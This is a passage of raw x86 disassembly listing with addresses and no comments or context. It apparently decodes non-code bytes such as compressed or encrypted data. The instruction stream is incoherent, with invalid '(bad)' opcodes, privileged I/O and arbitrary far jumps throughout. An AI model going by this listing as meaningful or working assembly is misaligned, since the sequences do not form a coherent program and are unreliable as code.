  41d075:	rcr    BYTE PTR [esi],1
  41d077:	cmp    al,0x67
  41d079:	dec    edi
  41d07a:	aad    0x6a
  41d07c:	mov    al,ds:0xfe72e292
  41d081:	push   cs
  41d082:	dec    edi
  41d083:	sbb    eax,0xd1e0f818
  41d088:	fs pop eax
  41d08a:	or     al,0x25
  41d08c:	sub    BYTE PTR [esi+eiz*1],cl
  41d08f:	das    
  41d090:	mov    ecx,0xf0eae850
  41d095:	(bad)  
  41d096:	out    dx,eax
  41d097:	pop    ebx
  41d098:	lods   al,BYTE PTR ds:[esi]
  41d099:	xor    BYTE PTR [edi-0x1f78c8f9],0x77
  41d0a0:	push   es
  41d0a1:	in     eax,0x90
  41d0a3:	mov    al,BYTE PTR [ebp-0x52301880]
  41d0a9:	push   ebx
  41d0aa:	jo     0x41d04b
  41d0ac:	aas    
  41d0ad:	into   
  41d0ae:	pop    eax
  41d0af:	iret   
  41d0b0:	sbb    al,0xb0
  41d0b2:	inc    DWORD PTR gs:[ebp-0x51372855]
  41d0b9:	cmp    edx,edx
  41d0bb:	push   eax
  41d0bc:	inc    esp
  41d0bd:	xchg   ebx,eax
  41d0be:	sub    edx,eax
  41d0c0:	sub    eax,0xf2f89103
  41d0c5:	das    
  41d0c6:	jp     0x41d070
  41d0c8:	mov    ecx,0x23bd8327
  41d0cd:	shl    BYTE PTR [esi+0x1e52e72d],cl
  41d0d3:	push   ds
  41d0d4:	jo     0x41d09c
  41d0d6:	sbb    ch,BYTE PTR [ecx]
  41d0d8:	sar    BYTE PTR [esi+0x70652a09],cl
  41d0de:	jg     0x41d0d2
  41d0e0:	cmp    eax,0xcf9d0271
  41d0e5:	pop    es
  41d0e6:	jnp    0x41d06f
  41d0e8:	dec    ebp
  41d0e9:	and    DWORD PTR [ecx-0x1f],0xffffffc2
  41d0ed:	retf   
  41d0ee:	and    DWORD PTR [edi],ecx
  41d0f0:	imul   ebx,DWORD PTR [esi-0x48b4be31],0x12
  41d0f7:	push   edi
  41d0f8:	dec    ebp
  41d0f9:	inc    esp
  41d0fa:	or     DWORD PTR [ecx+0x78],ebx
  41d0fd:	arpl   cx,di
  41d0ff:	dec    edx
  41d100:	sub    cl,BYTE PTR [esi-0x6cfa23d5]
  41d106:	mov    eax,ds:0x624beb2
  41d10b:	in     al,dx
  41d10c:	test   al,0x98
  41d10e:	or     al,0x11
  41d110:	cwde   
  41d111:	mov    eax,0xc9e4ad53
  41d116:	es test eax,0xfe937ce0
  41d11c:	retf   0x9b1e
  41d11f:	std    
  41d120:	mov    dl,0xae
  41d122:	xchg   edi,eax
  41d123:	pop    esp
  41d124:	ins    BYTE PTR es:[edi],dx
  41d125:	(bad)  
  41d126:	repz sbb DWORD PTR [edi],eax
  41d129:	xor    al,0x6f
  41d12b:	mov    ebx,0x95ccd94e
  41d130:	push   cs
  41d131:	mov    esi,0xb75bab
  41d136:	fdivr  DWORD PTR [edx+0x25f8f93]
  41d13c:	(bad)  
  41d13d:	icebp  
  41d13e:	fwait
  41d13f:	mov    BYTE PTR [ebx+0xe],dl
  41d142:	jb     0x41d15f
  41d144:	mov    DWORD PTR [edi+0x7c],edx
  41d147:	sub    ebp,DWORD PTR [ecx]
  41d149:	inc    edi
  41d14a:	aaa    
  41d14b:	mov    dh,0x47
  41d14d:	xchg   edx,eax
  41d14e:	leave  
  41d14f:	dec    ebp
  41d150:	add    al,0x45
  41d152:	inc    esi
  41d153:	adc    edi,DWORD PTR [ebp+0x5e]
  41d156:	fistp  DWORD PTR [edx-0x56]
  41d159:	or     ch,BYTE PTR [edi-0x756acd6e]
  41d15f:	xchg   ecx,eax
  41d160:	mov    bh,0xf6
  41d162:	scas   al,BYTE PTR es:[edi]
  41d163:	inc    ebp
  41d164:	fistp  WORD PTR ds:0x236eda50
  41d16a:	xchg   BYTE PTR [ecx-0x47],ah
  41d16d:	fist   WORD PTR [esi]
  41d16f:	xor    DWORD PTR [eax],edx
  41d171:	inc    ecx
  41d172:	add    al,0x2d
  41d174:	test   DWORD PTR [ecx+0x6bdd1804],0x6eaa419b
  41d17e:	xchg   ebp,eax
  41d17f:	mov    cs,esp
  41d181:	aad    0x43
  41d183:	push   eax
  41d184:	test   ebx,esp
  41d186:	mov    dl,0x93
  41d188:	push   ss
  41d189:	(bad)  
  41d18a:	int3   
  41d18b:	dec    ecx
  41d18c:	jmp    0x710851d0
  41d191:	add    edx,DWORD PTR [ebx]
  41d193:	xchg   ebx,eax
  41d194:	mov    dh,0x5e
  41d196:	and    bh,BYTE PTR [edi-0x56]
  41d199:	xchg   ebp,eax
  41d19a:	leave  
  41d19b:	lahf   
  41d19c:	cmc    
  41d19d:	ret    
  41d19e:	sub    edi,DWORD PTR [ecx-0x775782ca]
  41d1a4:	cs jge 0x41d15c
  41d1a7:	das    
  41d1a8:	arpl   WORD PTR [ebx],si
  41d1aa:	inc    esi
  41d1ab:	cs out 0x88,al
  41d1ae:	jp     0x41d19f
  41d1b0:	loopne 0x41d178
  41d1b2:	xor    DWORD PTR [edi],esi
  41d1b4:	lock jge 0x41d166
  41d1b7:	sbb    eax,0x77a4106b
  41d1bc:	retf   0xfdf7
  41d1bf:	out    dx,al
  41d1c0:	xchg   esp,eax
  41d1c1:	add    bl,ch
  41d1c3:	adc    al,0x47
  41d1c5:	std    
  41d1c6:	cmp    DWORD PTR [ebx],0x15
  41d1c9:	mov    DWORD PTR [edx],esi
  41d1cb:	ss push 0xe215bceb
  41d1d1:	out    dx,al
  41d1d2:	daa    
  41d1d3:	popa   
  41d1d4:	int3   
  41d1d5:	ss ins DWORD PTR es:[edi],dx
  41d1d7:	mov    ebp,0x27404435
  41d1dc:	aad    0x66
  41d1de:	or     BYTE PTR [ecx+eiz*4-0x20952ec8],al
  41d1e5:	ret    0xbdcd
  41d1e8:	fs aad 0x7e
  41d1eb:	call   0x412b:0x5456cdbf
  41d1f2:	pop    esi
  41d1f3:	add    eax,0xd92feca3
  41d1f8:	idiv   DWORD PTR [edi]
  41d1fa:	popa   
  41d1fb:	lods   al,BYTE PTR ds:[esi]
  41d1fc:	pop    edi
  41d1fd:	mov    ah,0xff
  41d1ff:	add    al,BYTE PTR [edx+0x71]
  41d202:	(bad)  
  41d203:	out    dx,al
  41d204:	cmp    al,BYTE PTR ds:0x1d7bd549
  41d20a:	pop    es
  41d20b:	push   ecx
  41d20c:	mov    dh,0x53
  41d20e:	inc    esp
  41d20f:	call   0x8de1:0x1d6fe47e
  41d216:	fstp   QWORD PTR [ebp+0x5ff7bfa8]
  41d21c:	and    DWORD PTR [edx],ecx
  41d21e:	stc    
  41d21f:	dec    edi
  41d220:	(bad)  
  41d221:	xor    eax,0xe16ba78f
  41d226:	cmp    al,0xc7
  41d228:	scas   al,BYTE PTR es:[edi]
  41d229:	jge    0x41d1d3
  41d22b:	fimul  WORD PTR [ebx+0x325692ac]
  41d231:	js     0x41d1bf
  41d233:	rcr    bl,0x6f
  41d236:	shl    cl,1
  41d238:	icebp  
  41d239:	mov    BYTE PTR [ebx-0x12f88aa3],cl
  41d23f:	jae    0x41d206
  41d241:	fadd   QWORD PTR [edi]
  41d243:	mov    bl,0xa7
  41d245:	lods   al,BYTE PTR ds:[esi]
  41d246:	mov    al,0x9b
  41d248:	loop   0x41d267
  41d24a:	fwait
  41d24b:	adc    bh,BYTE PTR ss:[ebp+0x3fa2d821]
  41d252:	mov    DWORD PTR [ebx-0x6],0x6aeec145
  41d259:	idiv   DWORD PTR [ecx-0x16]
  41d25c:	arpl   WORD PTR [edx],cx
  41d25e:	jnp    0x41d297
  41d260:	pop    edi
  41d261:	xchg   esp,eax
  41d262:	add    eax,0x5eb3bcb7
  41d267:	jnp    0x41d2c6
  41d269:	lahf   
  41d26a:	dec    BYTE PTR [ebp-0x65cc64ea]
  41d270:	jmp    FWORD PTR [esi-0x31]
  41d273:	daa    
  41d274:	popf   
  41d275:	call   0x4d88a93c
  41d27a:	jbe    0x41d296
  41d27c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d27d:	mov    DWORD PTR [edx],esp
  41d27f:	mov    dl,0xa
  41d281:	lds    ebx,FWORD PTR [esi+eiz*1-0x17]
  41d285:	or     al,0x13
  41d287:	pop    edi
  41d288:	adc    edi,DWORD PTR [ebx-0x30]
  41d28b:	mov    dh,0x81
  41d28d:	outs   dx,BYTE PTR ds:[esi]
  41d28e:	test   al,0xea
  41d290:	xchg   DWORD PTR [esi+0x3f],ebx
  41d293:	inc    esi
  41d294:	xchg   ecx,eax
  41d295:	fdiv   DWORD PTR [esi]
  41d297:	aas    
  41d298:	push   ebx
  41d299:	rcr    BYTE PTR [eax+0x6b],cl
  41d29c:	sub    al,0x41
  41d29e:	mov    dh,0x6d
  41d2a0:	mov    cs,edx
  41d2a2:	mov    al,0xf2
  41d2a4:	cdq    
  41d2a5:	lods   eax,DWORD PTR ds:[esi]
  41d2a6:	cli    
  41d2a7:	or     DWORD PTR [edi],esi
  41d2a9:	push   cs
  41d2aa:	mov    cl,0x65
  41d2ac:	retf   0x37d5
  41d2af:	dec    ebp
  41d2b0:	mov    edi,0x1763658b
  41d2b5:	fbstp  TBYTE PTR [edi]
  41d2b7:	aas    
  41d2b8:	sbb    esi,DWORD PTR [eax]
  41d2ba:	lds    ebp,FWORD PTR ds:0xa7729229
  41d2c0:	xchg   al,ah
  41d2c2:	call   0xd5b3:0x28e6d59d
  41d2c9:	xchg   BYTE PTR [edi],ah
  41d2cb:	sbb    ah,ah
  41d2cd:	dec    ebx
  41d2ce:	sub    BYTE PTR [ebx-0x4f28277b],al
  41d2d4:	mov    ds:0xce240b2,eax
  41d2d9:	mov    BYTE PTR [edi],al
  41d2db:	loopne 0x41d31e
  41d2dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2de:	push   edi
  41d2df:	test   al,0x6f
  41d2e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2e2:	loop   0x41d32e
  41d2e4:	loope  0x41d357
  41d2e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2e7:	push   esi
  41d2e8:	ja     0x41d332
  41d2ea:	and    al,0x42
  41d2ec:	lahf   
  41d2ed:	pop    esp
  41d2ee:	outs   dx,DWORD PTR ds:[esi]
  41d2ef:	jg     0x41d2c2
  41d2f1:	mul    DWORD PTR [ebp+0x3b]
  41d2f4:	sbb    esp,DWORD PTR [ecx]
  41d2f6:	sbb    ch,BYTE PTR [eax+0x3b]
  41d2f9:	dec    esi
  41d2fa:	add    eax,0x51f1107b
  41d2ff:	or     bh,BYTE PTR [esi-0x60]
  41d302:	add    al,0x3d
  41d304:	adc    dl,BYTE PTR [ecx+0x1a]
  41d307:	xchg   ecx,eax
  41d308:	leave  
  41d309:	ret    
  41d30a:	and    al,0x32
  41d30c:	int3   
  41d30d:	bound  esi,QWORD PTR [esi+ebp*4]
  41d310:	clc    
  41d311:	retf   0x87f5
  41d314:	lods   eax,DWORD PTR ds:[esi]
  41d315:	ins    DWORD PTR es:[edi],dx
  41d316:	out    dx,al
  41d317:	pusha  
  41d318:	cmp    al,0x89
  41d31a:	fidivr DWORD PTR [edx]
  41d31c:	jmp    0xaab991eb
  41d321:	push   es
  41d322:	dec    ebp
  41d323:	dec    ebx
  41d324:	and    eax,0x7edab94d
  41d329:	call   0x87a3:0xb0aba6d1
  41d330:	fwait
  41d331:	into   
  41d332:	add    BYTE PTR [ebp+0x59625ef0],dh
  41d338:	or     al,bl
  41d33a:	cdq    
  41d33b:	xor    al,BYTE PTR [ecx+0x21]
  41d33e:	add    dh,0x43
  41d341:	dec    esi
  41d342:	cdq    
  41d343:	push   0x3e03d5b2
  41d348:	imul   eax,DWORD PTR [ebx-0x7610f317],0x3f788815
  41d352:	(bad)  
  41d353:	rol    bh,0x4b
  41d356:	xor    esp,DWORD PTR [ecx-0x4c]
  41d359:	test   BYTE PTR [eax+0x6cb07bf3],ch
  41d35f:	or     DWORD PTR [eax],eax
  41d361:	xchg   BYTE PTR [eax-0x52],ch
  41d364:	lods   eax,DWORD PTR ds:[esi]
  41d365:	in     eax,dx
  41d366:	pop    DWORD PTR [eax+0x6]
  41d369:	jb     0x41d32a
  41d36b:	loop   0x41d313
  41d36d:	jmp    0x1dd5:0x2a222e7c
  41d374:	jg     0x41d30e
  41d376:	mov    cl,BYTE PTR [ebx-0x546356ac]
  41d37c:	cmp    ch,BYTE PTR [edx]
  41d37e:	adc    ebp,DWORD PTR [ecx+0x19]
  41d381:	jmp    0x92f5:0xa2448e01
  41d388:	or     DWORD PTR ds:0xef07d588,eax
  41d38e:	jecxz  0x41d3ee
  41d390:	imul   esi,esi,0x35299c44
  41d396:	sub    eax,0x528d17ce
  41d39b:	mov    dl,0xfc
  41d39d:	xor    esp,edi
  41d39f:	add    esi,DWORD PTR [esp+eiz*8]
  41d3a2:	mov    ebx,edi
  41d3a4:	jp     0x41d393
  41d3a6:	and    al,0x8a
  41d3a8:	push   ss
  41d3a9:	test   bl,dl
  41d3ab:	xor    ebx,DWORD PTR [edx+0x7]
  41d3ae:	aaa    
  41d3af:	arpl   WORD PTR [esp],sp
  41d3b2:	mov    edx,es
  41d3b4:	mov    edx,esi
  41d3b6:	jno    0x41d3bf
  41d3b8:	mov    ebp,DWORD PTR [di-0xe7f]
  41d3bd:	push   0xf3b0693d
  41d3c2:	adc    BYTE PTR [edi],al
  41d3c4:	mov    al,ds:0xc5a149b6
  41d3c9:	aad    0x31
  41d3cb:	repz ret 
  41d3cd:	js     0x41d396
  41d3cf:	cmp    ah,BYTE PTR [edi+edx*4+0x26d871]
  41d3d6:	fs ins DWORD PTR es:[edi],dx
  41d3d8:	pop    ebp
  41d3d9:	mov    cs,WORD PTR [ebx]
  41d3db:	(bad)  
  41d3dc:	retf   0xfc4e
  41d3df:	imul   edx,DWORD PTR [edi*8+0xb5a58bc],0x58655321
  41d3ea:	xchg   esi,eax
  41d3eb:	inc    edi
  41d3ec:	stc    
  41d3ed:	dec    ebp
  41d3ee:	and    BYTE PTR [ebx],bh
  41d3f0:	mov    edx,0xd39a7d26
  41d3f5:	dec    esi
  41d3f6:	or     ch,BYTE PTR [eax-0x6e]
  41d3f9:	adc    al,0x75
  41d3fb:	lock imul ebx,DWORD PTR [edi+0x55cb2f57],0x9114a3ec
  41d406:	sbb    ah,BYTE PTR [esi+0x2f1c212b]
  41d40c:	stos   BYTE PTR es:[edi],al
  41d40d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d40e:	outs   dx,DWORD PTR ds:[esi]
  41d40f:	les    esp,FWORD PTR [ebx-0x22]
  41d412:	pop    eax
  41d413:	push   ds
  41d414:	inc    esp
  41d415:	in     al,dx
  41d416:	loopne 0x41d42e
  41d418:	jle    0x41d468
  41d41a:	adc    dh,BYTE PTR [ebx]
  41d41c:	arpl   si,bx
  41d41e:	in     eax,0xc
  41d420:	mov    edi,0x7d3e2c7e
  41d425:	add    bh,BYTE PTR [edi-0x7ccf15f2]
  41d42b:	cdq    
  41d42c:	sbb    DWORD PTR [ebp-0x7b],edi
  41d42f:	and    bh,BYTE PTR [ecx+edx*2]
  41d432:	in     al,dx
  41d433:	and    esp,DWORD PTR [esi]
  41d435:	or     eax,0x4ebfa15b
  41d43a:	push   ebp
  41d43b:	nop
  41d43c:	and    DWORD PTR [eax+0x4a],ebp
  41d43f:	dec    ecx
  41d440:	scas   eax,DWORD PTR es:[edi]
  41d441:	test   DWORD PTR [edi-0x3d],esi
  41d444:	stc    
  41d445:	xchg   esp,eax
  41d446:	fwait
  41d447:	ja     0x41d4c5
  41d449:	arpl   WORD PTR [eax],bp
  41d44b:	sub    BYTE PTR [edx+esi*4+0x59049ceb],cl
  41d452:	sbb    ecx,DWORD PTR [ebx]
  41d454:	call   0xb15a:0x74cfe329
  41d45b:	ja     0x41d49b
  41d45d:	cs cmp edx,0x75d8aa5d
  41d464:	fbld   TBYTE PTR [ecx+edi*1-0x40e3504a]
  41d46b:	lods   al,BYTE PTR ds:[esi]
  41d46c:	aaa    
  41d46d:	fadd   QWORD PTR [edx*8-0x31b147fa]
  41d474:	or     DWORD PTR [esi],0xffffffb7
  41d477:	push   0x3c2db885
  41d47c:	test   bh,bl
  41d47e:	daa    
  41d47f:	xor    eax,0x5619f52c
  41d484:	dec    esp
  41d485:	cmc    
  41d486:	push   ds
  41d487:	lahf   
  41d488:	adc    al,0xab
  41d48a:	xor    al,BYTE PTR [esi]
  41d48c:	rcr    DWORD PTR [ebx+0x78c6a274],cl
  41d492:	lock mov dl,0xe0
  41d495:	adc    al,0x92
  41d497:	xor    DWORD PTR [esi+0x15],edi
  41d49a:	leave  
  41d49b:	call   0xabc:0x7cbffe30
  41d4a2:	mov    eax,ss
  41d4a4:	addr16 fwait
  41d4a6:	test   DWORD PTR [eax-0x79],eax
  41d4a9:	adc    DWORD PTR [eax+0x58],0x13eb3b14
  41d4b0:	adc    eax,DWORD PTR [esi+0x61014ef2]
  41d4b6:	sub    BYTE PTR [edx+0x3408b186],dl
  41d4bc:	aaa    
  41d4bd:	sbb    cl,dl
  41d4bf:	test   al,0xe0
  41d4c1:	xchg   bh,dl
  41d4c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4c4:	inc    edx
  41d4c5:	lods   al,BYTE PTR ds:[esi]
  41d4c6:	ret    
  41d4c7:	lods   eax,DWORD PTR ds:[esi]
  41d4c8:	xor    BYTE PTR [edx+0x261881ea],ah
  41d4ce:	pop    ebp
  41d4cf:	test   BYTE PTR [edi-0x7404f557],ah
  41d4d5:	mov    ds:0xfb7f60fd,al
  41d4da:	adc    bh,BYTE PTR [esi-0x3f]
  41d4dd:	xchg   ebx,eax
  41d4de:	push   ds
  41d4df:	rol    ebx,cl
  41d4e1:	aam    0xb9
  41d4e3:	mov    bh,0x1f
  41d4e5:	lods   eax,DWORD PTR ds:[esi]
  41d4e6:	shl    DWORD PTR [ebp-0x4d],0xa8
  41d4ea:	mov    esi,0x702c42ac
  41d4ef:	jbe    0x41d4da
  41d4f1:	xor    eax,0x1f3593df
  41d4f6:	mov    ch,0xd9
  41d4f8:	loop   0x41d4ad
  41d4fa:	and    al,0x1c
  41d4fc:	add    esi,DWORD PTR [esp+edi*1+0x5aadad20]
  41d503:	ret    
  41d504:	(bad)  
  41d505:	xor    al,0x4f
  41d507:	(bad)  
  41d508:	sbb    eax,0x4f5ecbde
  41d50d:	out    dx,al
  41d50e:	lea    eax,[edi+0x12]
  41d511:	mov    ds:0xdb03aa52,eax
  41d516:	cmc    
  41d517:	in     eax,dx
  41d518:	not    DWORD PTR [edx-0x6a716d73]
  41d51e:	out    dx,al
  41d51f:	popf   
  41d520:	mov    ch,0x24
  41d522:	ins    BYTE PTR es:[edi],dx
  41d523:	repnz mov ds:0x1401acae,eax
  41d52a:	jae    0x41d594
  41d52c:	(bad)  
  41d52d:	bound  eax,QWORD PTR [edi-0x59208f64]
  41d533:	popa   
  41d534:	aas    
  41d535:	loop   0x41d5b6
  41d537:	outs   dx,DWORD PTR ds:[esi]
  41d538:	mov    esp,0xce4329c1
  41d53d:	sbb    al,0x5d
  41d53f:	sub    cl,0x9a
  41d542:	hlt    
  41d543:	push   esi
  41d544:	in     al,0xa4
  41d546:	(bad)  
  41d548:	xchg   ecx,eax
  41d549:	pop    ebp
  41d54a:	adc    DWORD PTR [edx-0x15],ecx
  41d54d:	arpl   WORD PTR [edx+edx*1+0x5a],si
  41d551:	mov    eax,ds:0x912a6afb
  41d556:	mov    WORD PTR [edi+edx*4+0x74],gs
  41d55a:	sub    ah,BYTE PTR [ebx]
  41d55c:	mov    eax,0xa6b66ccf
  41d561:	retf   
  41d562:	add    BYTE PTR [edi+0x53],0x8
  41d566:	loop   0x41d542
  41d568:	repnz mov eax,0xf78ba08e
  41d56e:	dec    esp
  41d56f:	(bad)  
  41d570:	fdiv   QWORD PTR [esi+0x389eef09]
  41d576:	mov    DWORD PTR [ecx],edx
  41d578:	add    ch,ch
  41d57a:	sbb    eax,DWORD PTR [ebx+edi*4-0x18]
  41d57e:	push   ecx
  41d57f:	(bad)  
  41d581:	jle    0x41d54c
  41d583:	pop    ecx
  41d584:	inc    edx
  41d585:	sahf   
  41d586:	xchg   ecx,eax
  41d587:	add    BYTE PTR [eax-0x2a5c8bef],0x7b
  41d58e:	cli    
  41d58f:	test   BYTE PTR [edx+0x52],bl
  41d592:	bound  edx,QWORD PTR [ecx-0x37]
  41d595:	shr    DWORD PTR [ebp+0x661b794f],0xf9
  41d59c:	mov    eax,0xc514a2b3
  41d5a1:	sub    al,0x83
  41d5a3:	in     eax,dx
  41d5a4:	in     eax,dx
  41d5a5:	mov    cl,0xc1
  41d5a7:	enter  0x1b2f,0xf6
  41d5ab:	xchg   ebx,eax
  41d5ac:	pop    esi
  41d5ad:	out    0x9b,al
  41d5af:	jo     0x41d5a9
  41d5b1:	xchg   edx,eax
  41d5b2:	int    0x78
  41d5b4:	cwde   
  41d5b5:	fisttp WORD PTR [ebx-0x15007e8d]
  41d5bb:	jg     0x41d56e
  41d5bd:	cs enter 0x7d4a,0x64
  41d5c2:	je     0x41d619
  41d5c4:	mov    dl,0x8a
  41d5c6:	xlat   BYTE PTR ds:[ebx]
  41d5c7:	pop    es
  41d5c8:	repnz popa 
  41d5ca:	push   ebx
  41d5cb:	hlt    
  41d5cc:	jle    0x41d5ca
  41d5ce:	icebp  
  41d5cf:	xor    DWORD PTR [ebx+eiz*1+0x4080f3ea],edx
  41d5d6:	push   esi
  41d5d7:	jne    0x41d601
  41d5d9:	xchg   ecx,eax
  41d5da:	cwde   
  41d5db:	inc    eax
  41d5dc:	lock jp 0x41d5b5
  41d5df:	push   edx
  41d5e0:	sub    eax,eax
  41d5e2:	nop
  41d5e3:	push   cs
  41d5e4:	fucomip st,st(5)
  41d5e6:	js     0x41d5b4
  41d5e8:	dec    ebp
  41d5e9:	sbb    dh,BYTE PTR [ebx-0x297dd2e1]
  41d5ef:	sub    BYTE PTR [ebx+edi*4],ah
  41d5f2:	mov    bh,0x23
  41d5f4:	stc    
  41d5f5:	sbb    al,0xef
  41d5f7:	sbb    DWORD PTR [ebx],0xcf9f8d08
  41d5fd:	syscall 
  41d5ff:	and    BYTE PTR [edi-0x17],ch
  41d602:	ja     0x41d588
  41d604:	dec    esp
  41d605:	pop    ds
  41d606:	ins    DWORD PTR es:[edi],dx
  41d607:	jmp    0x7858:0xdca30022
  41d60e:	fisubr WORD PTR [ecx+0x47]
  41d611:	ds push edx
  41d613:	xor    BYTE PTR ds:0x8d576fec,ch
  41d619:	dec    edx
  41d61a:	adc    BYTE PTR [ebp-0x13],0xf3
  41d61e:	fst    QWORD PTR [ebp+0x36]
  41d621:	mov    ebx,0xac6e7079
  41d626:	rol    ebp,1
  41d628:	ror    al,0x43
  41d62b:	jno    0x41d632
  41d62d:	pop    ss
  41d62e:	loop   0x41d5b5
  41d630:	mov    eax,0x964b12ee
  41d635:	shl    BYTE PTR [ecx+0x6ec2a8fa],1
  41d63b:	mov    bl,0xb5
  41d63d:	fwait
  41d63e:	add    eax,0x9a4280e
  41d643:	ret    0xb072
  41d646:	addr16 pop edi
  41d648:	into   
  41d649:	dec    edi
  41d64a:	mov    ss,ecx
  41d64c:	inc    ebx
  41d64d:	add    bh,0xc7
  41d650:	bound  ecx,QWORD PTR [ecx-0x43c9162d]
  41d656:	cmp    esi,DWORD PTR [ebp+0x4612957]
  41d65c:	push   ecx
  41d65d:	pop    ss
  41d65e:	xchg   esi,eax
  41d65f:	outs   dx,BYTE PTR ds:[esi]
  41d660:	cli    
  41d661:	aad    0x56
  41d663:	and    al,0x4e
  41d665:	mov    cs,WORD PTR [esi+0x2fb04409]
  41d66b:	test   eax,0x161ffabc
  41d670:	je     0x41d6a8
  41d672:	stos   BYTE PTR es:[edi],al
  41d673:	arpl   cx,bp
  41d675:	ds std 
  41d677:	call   0xae:0x7124b1b3
  41d67e:	icebp  
  41d67f:	inc    ecx
  41d680:	dec    eax
  41d681:	imul   edi,ecx,0xffffffde
  41d684:	test   DWORD PTR [edi-0x5e],eax
  41d687:	dec    ecx
  41d688:	jmp    0x20bd:0x533469e1
  41d68f:	xchg   ebp,eax
  41d690:	xchg   edi,eax
  41d691:	pop    edi
  41d692:	out    0x44,al
  41d694:	not    edx
  41d696:	mul    BYTE PTR [ecx]
  41d698:	and    al,0x30
  41d69a:	xor    al,0x88
  41d69c:	or     al,0x11
  41d69e:	loope  0x41d70f
  41d6a0:	outs   dx,BYTE PTR ds:[esi]
  41d6a1:	(bad)  
  41d6a2:	adc    dh,bh
  41d6a4:	push   0x7b71b7dd
  41d6a9:	jae    0x41d724
  41d6ab:	inc    edi
  41d6ac:	sub    eax,DWORD PTR [eax]
  41d6ae:	pop    eax
  41d6af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6b0:	(bad)  
  41d6b1:	fcom   DWORD PTR [eax-0x677eb1a8]
  41d6b7:	sub    eax,0x2cf991f9
  41d6bc:	jg     0x41d651
  41d6be:	mov    eax,0x3bf2c736
  41d6c3:	xchg   ebp,edi
  41d6c5:	mov    bh,0x69
  41d6c7:	test   DWORD PTR [ecx-0x113c96c4],esp
  41d6cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6ce:	lahf   
  41d6cf:	inc    eax
  41d6d0:	adc    eax,0x2161f01e
  41d6d5:	jno    0x41d6da
  41d6d7:	sbb    eax,0x6d191ce0
  41d6dc:	rcl    DWORD PTR [edx-0x10e63599],1
  41d6e2:	push   edx
  41d6e3:	sbb    BYTE PTR [edi],bl
  41d6e5:	xor    al,0xd3
  41d6e7:	push   ds
  41d6e8:	mov    esp,0x4d47c813
  41d6ed:	sti    
  41d6ee:	dec    ecx
  41d6ef:	fs sub eax,0xdd83872b
  41d6f5:	sbb    BYTE PTR [eax-0x5f08f7cd],ah
  41d6fb:	scas   eax,DWORD PTR es:[edi]
  41d6fc:	inc    edx
  41d6fd:	sbb    ecx,DWORD PTR [eax]
  41d6ff:	ret    
  41d700:	xchg   ebx,eax
  41d701:	push   eax
  41d702:	repz cmp dh,BYTE PTR [edi+0x32]
  41d706:	inc    edx
  41d707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d708:	sub    al,0xed
  41d70a:	inc    esp
  41d70b:	adc    BYTE PTR [edx+0x6],0xc0
  41d70f:	pop    esi
  41d710:	mov    edi,0xa6e6e697
  41d715:	repnz xor BYTE PTR [ecx+edx*8-0x2b95bfc2],al
  41d71d:	sub    ebp,DWORD PTR [edi]
  41d71f:	inc    eax
  41d720:	adc    esp,DWORD PTR [eax]
  41d722:	lds    ebx,FWORD PTR [ecx-0x338ab55c]
  41d728:	jp     0x41d726
  41d72a:	pop    ebx
  41d72b:	jecxz  0x41d734
  41d72d:	cld    
  41d72e:	sbb    DWORD PTR [edx-0x21],ebp
  41d731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d732:	lahf   
  41d733:	jae    0x41d733
  41d735:	outs   dx,BYTE PTR ds:[esi]
  41d736:	sbb    eax,0xa6380d93
  41d73b:	in     al,dx
  41d73c:	cs push ss
  41d73e:	ins    DWORD PTR es:[edi],dx
  41d73f:	inc    edi
  41d740:	mov    ds:0x3f41482f,eax
  41d745:	jmp    0x41d6f1
  41d747:	jo     0x41d6d6
  41d749:	adc    al,0xf4
  41d74b:	xor    esp,0xffffff90
  41d74e:	lock stc 
  41d750:	jmp    0xa933:0x6c16938a
  41d757:	aaa    
  41d758:	repz jns 0x41d770
  41d75b:	outs   dx,BYTE PTR ds:[esi]
  41d75c:	xchg   esp,eax
  41d75d:	jecxz  0x41d77c
  41d75f:	pop    ds
  41d760:	jnp    0x41d6fc
  41d762:	lea    ecx,[edx]
  41d764:	shl    DWORD PTR [esi-0x5b],1
  41d767:	dec    esp
  41d768:	xor    DWORD PTR [eax],ebx
  41d76a:	add    DWORD PTR [ecx-0x2924e646],0xbbb45378
  41d774:	outs   dx,DWORD PTR ds:[esi]
  41d775:	xchg   ebp,eax
  41d776:	push   edi
  41d777:	mov    gs,WORD PTR [esi+0x6d]
  41d77a:	sbb    eax,0xf702b230
  41d77f:	xchg   esp,eax
  41d780:	ret    0xd074
  41d783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d784:	out    dx,eax
  41d785:	xor    al,0x7e
  41d787:	mov    al,0x14
  41d789:	mov    ecx,0xb6408f0f
  41d78e:	pusha  
  41d78f:	daa    
  41d790:	aam    0x66
  41d792:	cmp    BYTE PTR [eax+0x72],0x8e
  41d796:	add    BYTE PTR [edi+ebp*4+0x4],al
  41d79a:	out    dx,al
  41d79b:	daa    
  41d79c:	fdiv   QWORD PTR fs:[edx+ebp*8+0x2c2a99e0]
  41d7a4:	pop    ecx
  41d7a5:	getsec 
  41d7a7:	neg    BYTE PTR [eax+0x4b]
  41d7aa:	neg    DWORD PTR cs:[ebx-0x1f]
  41d7ae:	mov    ecx,0x5003213
  41d7b3:	mov    ds:0x14697827,eax
  41d7b8:	mov    ah,0x1d
  41d7ba:	mov    al,0x36
  41d7bc:	(bad)  [edi-0x7b67f1ca]
  41d7c2:	pusha  
  41d7c3:	ror    BYTE PTR [eax],1
  41d7c5:	mov    DWORD PTR [eax],esi
  41d7c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7c8:	xchg   esi,esp
  41d7ca:	loop   0x41d78e
  41d7cc:	out    0x39,eax
  41d7ce:	nop
  41d7cf:	rcr    BYTE PTR [ebp+0x1112bf3],0x69
  41d7d6:	push   es
  41d7d7:	in     eax,0x12
  41d7d9:	xchg   ebp,eax
  41d7da:	fld    DWORD PTR [ebp+0x28e6464c]
